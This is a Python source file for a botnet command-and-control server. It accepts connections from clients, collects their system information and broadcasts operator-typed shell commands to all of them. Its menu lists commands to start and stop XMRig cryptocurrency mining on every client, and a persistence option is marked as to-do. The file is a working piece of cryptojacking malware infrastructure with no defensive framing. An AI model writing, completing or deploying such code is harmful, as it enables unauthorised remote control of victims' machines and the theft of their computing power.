import json
import os
import socket
import subprocess
import threading

# Define global variables
is_running = True
clients = []

# Function to handle client communication
def handle_client(client_socket):
    while True:
        try:
            message = client_socket.recv(4096).decode('utf-8')
            if message:
                if message.startswith("{") and message.endswith("}"):
                    # Handle JSON system info message
                    system_info = json.loads(message)
                    print(f"Received system info: {system_info}")
                else:
                    # Handle other types of messages
                    print(f"[Client] {message}")
        except ConnectionResetError:
            print("Client disconnected.")
            break
        except Exception as e:
            print(f"Error handling client: {e}")
            break
    client_socket.close()
    clients.remove(client_socket)

# Function to send a command to all clients
def send_command(command):
    for client in clients:
        try:
            if client:
                client.send(command.encode('utf-8'))
        except Exception as e:
            print(f"Error sending command to client: {e}")

# Function to send a message to all clients
def send_message_to_all_clients(message):
    for client in clients:
        try:
            client.send(message.encode('utf-8'))
        except Exception as e:
            print(f"Error sending message to client: {e}")

# Server program
def server_program():
    global is_running
    host = '192.168.0.104'
    port = 12345

    server_socket = socket.socket()
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    try:
        while is_running:
            client_socket, address = server_socket.accept()
            print(f"Connection from {address} has been established.")
            clients.append(client_socket)
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()
    finally:
        server_socket.close()

# Function to print available commands
def print_help():
    help_text = """
    Available Commands:
    1: Send a manual command to all clients.
    2: Send a message to all clients
    3: Request info about OS and PC from all clients.
    4: Start mining on all clients.
    5: Stop mining on all clients.
    6: Add persistance to all clients.#to-do
    join: Join a client from a list.#to-do
    h or help: Show this help message.
    exit: Close the server and disconnect all clients.
    end: End the program.
    """
    print(help_text)

# Main function
def main():
    global is_running
    server_thread = threading.Thread(target=server_program)
    server_thread.start()

    while True:
        user_input = input("Command: ")

        if user_input == 'end':
            # Shut down the server
            print("Shutting down the server...")
            is_running = False
            break
        elif user_input in ['h', 'help']:
            print_help()
        elif user_input == '1':
            cmd = input("Enter command: ")
            send_command(cmd)
        elif user_input == '2':
            message = input("Message: ")
            send_message_to_all_clients("message:" + message)
        elif user_input == '3':
            send_command("get_system_info")
        elif user_input == '4':
            send_command("start_mining:/path/to/xmrig")
        elif user_input == '5':
            send_command("stop_mining")
        elif user_input == '6':
            send_command("add_persistance not yet done")
        elif user_input == 'join':
            print("Joining... not yet done")
        elif user_input == 'exit':
            for client in clients:
                client.close()
        else:
            print("Unknown command. Type 'h' or 'help' for a list of commands.")

if __name__ == '__main__':
    print("Please press h and then enter to show help menu.")
    main()
